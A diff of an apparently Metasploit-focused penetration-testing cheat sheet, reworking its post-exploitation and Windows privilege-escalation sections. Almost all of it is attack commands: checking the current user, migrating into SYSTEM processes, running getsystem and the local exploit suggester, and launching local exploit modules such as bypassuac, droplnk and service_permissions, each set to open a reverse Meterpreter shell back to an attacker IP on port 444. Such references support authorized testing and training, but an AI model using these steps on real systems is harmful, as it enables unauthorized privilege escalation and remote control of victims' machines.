@@ -179,88 +179,54 @@ Many options allow specifying session ranges using commas and dashes. For exampl
      sessions -k 1-3,6
 ------------------------------------------------------------------------------------------------------
 
-# Post exploitation - host situational awareness
+# Post exploitation
 
-getuid                                        Get the user that the server is running as
 sysinfo                                       Gets information about the remote system, such as OS
+getuid                                        Get the user that the server is running as
 ps                                            Search for a process running as NT AUTHORITY\SYSTEM (or root on *nix)
 migrate <PID>                                 Migrate to a process running as NT AUTHORITY\SYSTEM (or root on *nix)
-ipconfig                                      Show the target IP
-route                                         Look for an additional subnet
 ------------------------------------------------------------------------------------------------------
 
-# Privilege escalation
+# Privilege escalation - Windows
 
+- Option 1
 use priv                                      Attempt to elevate to NT AUTHORITY\SYSTEM
-background                                    If this fails, background the current session and try options
+getsystem                                     Will use a number of different techniques to attempt to gain SYSTEM 
+                                                 level privileges on the remote system
+background                                    If this fails, background the current session and try other options
 
-- Option 1:
+- Option 2
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
+- Option 3
+use post/windows/escalate/getsystem
+set SESSION 1
+run
+
+getuid
 getsystem
+getuid                                        Privileges should now be NT AUTHORITY\SYSTEM
 
-- Option 2:
-use exploit/windows/local/bypassuac
+- Option 4
+use post/windows/escalate/droplnk
 set SESSION 1
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <attacker IP>
 set LPORT 444                                 This MUST be a different port from what was used in the original exploit
 exploit
 
-- Option 3:
-run post/windows/escalate/getsystem
-getuid
-getsystem
-getuid                                        Privileges should now be NT AUTHORITY\SYSTEM
-
-- Option 4:
-use post/windows/escalate/droplnk
+- Option 5
+use exploit/windows/local/bypassuac
 set SESSION 1
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <attacker IP>
 set LPORT 444
 exploit
 
-- Option 5:
-use exploit/windows/local/service_permissions
-set SESSION 1
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker IP>
-set LPORT 444
-exploit
-
-- Option 6:
-use exploit/windows/local/trusted_service_path
-set SESSION 1
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker IP>
-set LPORT 444
-exploit
-
-- Option 7:
-use exploit/windows/local/ppr_flatten_rec
-set SESSION 1
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker IP>
-set LPORT 444
-exploit
-
-- Option 8:
-use exploit/windows/local/ms_ndproxy
-set SESSION 1
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker IP>
-set LPORT 444
-exploit
-
-- Option 9:
-use exploit/windows/local/ask
-set SESSION 1
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker IP>
-set LPORT 444
-exploit
-
-- Linux
-searchsploit 'privilege escalation' | grep <Linux distro>
+- Option 6
+use exploit/windows/local/                    There are currently 77 options - 12/29/19
 ------------------------------------------------------------------------------------------------------
 
 # Dump hashes
